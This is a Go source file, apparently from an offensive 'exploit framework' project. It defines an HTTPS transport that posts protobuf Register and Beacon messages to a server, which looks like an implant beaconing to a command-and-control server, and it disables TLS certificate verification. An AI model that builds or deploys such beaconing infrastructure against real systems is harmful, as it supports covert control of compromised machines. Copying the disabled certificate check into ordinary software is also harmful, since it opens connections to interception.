package transport

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/protobuf/proto"
)

type HTTPSTransport struct {
	baseURL string
	client  *http.Client
}

func NewHTTPSTransport(baseURL string) *HTTPSTransport {
	return &HTTPSTransport{
		baseURL: baseURL,
		client: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true, // Self-signed CA; pinning in Phase 2
				},
			},
		},
	}
}

func (t *HTTPSTransport) Register(reg *pb.Register) (*pb.RegisterResponse, error) {
	data, err := proto.Marshal(reg)
	if err != nil {
		return nil, fmt.Errorf("marshal register: %w", err)
	}

	resp, err := t.post("/register", data)
	if err != nil {
		return nil, err
	}

	result := &pb.RegisterResponse{}
	if err := proto.Unmarshal(resp, result); err != nil {
		return nil, fmt.Errorf("unmarshal register response: %w", err)
	}
	return result, nil
}

func (t *HTTPSTransport) Beacon(beacon *pb.Beacon) (*pb.BeaconResponse, error) {
	data, err := proto.Marshal(beacon)
	if err != nil {
		return nil, fmt.Errorf("marshal beacon: %w", err)
	}

	resp, err := t.post("/beacon", data)
	if err != nil {
		return nil, err
	}

	result := &pb.BeaconResponse{}
	if err := proto.Unmarshal(resp, result); err != nil {
		return nil, fmt.Errorf("unmarshal beacon response: %w", err)
	}
	return result, nil
}

func (t *HTTPSTransport) post(path string, body []byte) ([]byte, error) {
	url := t.baseURL + path
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("HTTP POST %s: %w", path, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d from %s", resp.StatusCode, path)
	}

	return io.ReadAll(io.LimitReader(resp.Body, 1<<20))
}
